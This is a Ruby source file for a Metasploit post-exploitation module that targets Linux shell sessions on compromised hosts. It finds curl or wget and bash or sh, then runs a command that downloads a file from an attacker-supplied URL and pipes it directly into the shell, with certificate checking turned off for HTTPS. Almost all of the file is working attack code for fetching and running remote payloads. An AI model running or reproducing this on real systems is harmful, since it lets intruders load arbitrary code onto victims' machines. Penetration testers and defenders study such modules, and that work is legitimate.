##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Linux Manage Download and Execute',
      'Description'   => %q{
          This module downloads and runs a file with bash. It first tries to uses curl as
        its HTTP client and then wget if it's not found. Bash found in the PATH is used to
        execute the file.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Joshua D. Abraham <jabra[at]praetorian.com>',
        ],
      'Platform'      => [ 'linux' ],
      'SessionTypes'  => [ 'shell' ]
    ))

    register_options(
      [
        OptString.new('URL', [true, 'Full URL of file to download.'])
      ], self.class)

  end

  def cmd_exec_vprint(cmd)
    vprint_status("Executing: #{cmd}")
    output = cmd_exec(cmd)
    if output.length > 0
      vprint_status("#{output}")
    end
    return
  end

  def exists_exe?(exe)
    path = expand_path("$PATH")
    if path.nil? or path.empty?
      return false
    end

    path.split(":").each{ |p|
      return true if file_exist?(p + "/" + exe)
    }

    return false
  end

  def search_http_client
    print_status("Checking if curl exists in the path...")
    if exists_exe?("curl")
      print_good("curl available, using it")
      @stdout_option = ""
      @http_client = "curl"
      @ssl_option = "-k"
      return
    end

    print_status("Checking if wget exists in the path...")
    if exists_exe?("wget")
      print_good("wget available, using it")
      @http_client = "wget"
      @stdout_option =  "-O-"
      @ssl_option = "--no-check-certificate"
      return
    end
  end

  def search_shell
    print_status("Checking if bash exists in the path...")
    if exists_exe?("bash")
      print_good("bash available, using it")
      @shell = "bash"
      return
    end

    print_status("Checking if sh exists in the path...")
    if exists_exe?("sh")
      print_good("sh available, using it")
      @shell = "sh"
      return
    end
  end

  def run
    search_http_client

    if not @http_client
      print_warning("neither curl nor wget available in the $PATH, aborting...")
      return
    end

    search_shell

    if not @shell
      print_warning("neither bash nor sh available in the $PATH, aborting...")
      return
    end

    if datastore['URL'].match(/https/)
      cmd_exec_vprint("`which #{@http_client}` #{@stdout_option} #{@ssl_option} #{datastore['URL']} 2>/dev/null | `which #{@shell}` ")
    else
      cmd_exec_vprint("`which #{@http_client}` #{@stdout_option} #{datastore['URL']} 2>/dev/null | `which #{@shell}` ")
    end
  end

end
